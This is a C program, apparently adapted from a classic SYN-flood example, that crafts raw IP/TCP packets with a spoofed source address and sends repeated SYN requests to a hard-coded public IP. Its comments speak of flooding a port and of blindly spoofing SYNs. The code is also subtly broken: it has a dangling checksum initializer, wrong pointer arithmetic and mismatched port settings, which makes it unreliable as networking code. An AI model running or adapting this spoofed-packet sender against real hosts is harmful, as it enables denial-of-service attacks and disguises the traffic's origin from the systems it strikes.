#define __USE_BSD	/* use bsd'ish ip header */
#include <sys/socket.h>	/* these headers are for a Linux system, but */
#include <netinet/in.h>	/* the names on other systems are easy to guess.. */
#include <netinet/ip.h>
#define __FAVOR_BSD	/* use bsd'ish tcp header */
#include <netinet/tcp.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>

#define P 25		/* lets flood the sendmail port */

unsigned short		/* this function generates header checksums */
csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

uint16_t tcp_checksum(const void *buff, size_t len, in_addr_t src_addr, in_addr_t dest_addr)
 {
         const uint16_t *buf=buff;
         uint16_t *ip_src=(void *)&src_addr, *ip_dst=(void *)&dest_addr;
         uint32_t sum;
         size_t length=len;
         // Calculate the sum                                            //
         sum = 0;
         while (len > 1)
         {
                 sum += *buf++;
                 if (sum & 0x80000000)
                         sum = (sum & 0xFFFF) + (sum >> 16);
                 len -= 2;
         }

         if ( len & 1 )
                 // Add the padding if the packet lenght is odd          //
                 sum += *((uint8_t *)buf);

         // Add the pseudo-header                                        //
         sum += *(ip_src++);
     printf("%d\n", sum);
         sum += *ip_src;
     printf("%d\n", sum);
         sum += *(ip_dst++);
         sum += *ip_dst;
         sum += htons(IPPROTO_TCP);
         sum += htons(length);

         // Add the carries                                              //
     while (sum >> 16) {
             sum = (sum & 0xFFFF) + (sum >> 16);
            printf("%d\n", sum);
     }
     uint16_t final_sum = sum;
     printf("%x\n", final_sum);
     printf("%x\n", ~final_sum);

         // Return the one's complement of sum
         return ( (uint16_t)(~sum)  );
}


int 
main (void)
{
  int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);	/* open raw socket */
  char datagram[4096];	/* this buffer will contain ip header, tcp header,
			   and payload. we'll point an ip header structure
			   at its beginning, and a tcp header structure after
			   that to write the header values into it */
  struct ip *iph = (struct ip *) datagram;
  struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
  struct sockaddr_in sin;
			/* the sockaddr_in containing the dest. address is used
			   in sendto() to determine the datagrams path */

  sin.sin_family = AF_INET;
  sin.sin_port = htons (P);/* you byte-order >1byte header values to network
			      byte order (not needed on big endian machines) */
  //sin.sin_addr.s_addr = inet_addr ("172.217.15.100");
    sin.sin_addr.s_addr = inet_addr ("172.217.15.100");

  memset (datagram, 0, 4096);	/* zero out the buffer */
  uint16_t old_chksm =
/* we'll now fill in the ip/tcp header values, see above for explanations */
  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);	/* no payload */
  iph->ip_id = (u_short) htonl (54321);	/* the value doesn't matter here */
  iph->ip_off = 0;
  iph->ip_ttl = 255;
  iph->ip_p = 6;
  iph->ip_sum = 0;		/* set it to 0 before computing the actual checksum later */
  iph->ip_src.s_addr = inet_addr ("10.0.0.105");/* SYN's can be blindly spoofed */
  iph->ip_dst.s_addr = sin.sin_addr.s_addr;
  tcph->th_sport = (u_short) htons (10515);	/* arbitrary port */
  tcph->th_dport = (u_short) htons (80);
  tcph->th_seq = random() % 65535;/* in a SYN packet, the sequence is a random */
  tcph->th_ack = 0;/* number, and the ack sequence is 0 in the 1st packet */
  tcph->th_x2 = 0;
  tcph->th_off = 5;		/* first and only tcp segment */
  tcph->th_flags = TH_SYN;	/* initial connection request */
  //tcph->th_win = (u_short) htonl (65535);	/* maximum allowed window size */
  tcph->th_win = htons(65535);
  tcph->th_urp = 0;
  //tcph->th_sum = 10445;
  tcph->th_sum = tcp_checksum(tcph, 20, iph->ip_src.s_addr, iph->ip_dst.s_addr);

  iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);

  struct tcphdr *test = (struct tcphdr *) datagram + sizeof (struct ip);

/* finally, it is very advisable to do a IP_HDRINCL call, to make sure
   that the kernel knows the header is included in the data, and doesn't
   insert its own header into the packet before our data */
		/* lets do it the ugly way.. */
  int one = 1;
  const int *val = &one;
  if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    printf ("Warning: Cannot set HDRINCL!\n");
  int count = 0;
  while (count < 10) {
    if (sendto (s, datagram, iph->ip_len,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)		
	    printf ("error\n");
    else
	    printf ("success. ");
      sleep(2);
      recv(s, datagram, sizeof(datagram), 0);
    count++;
  }

  return 0;
}
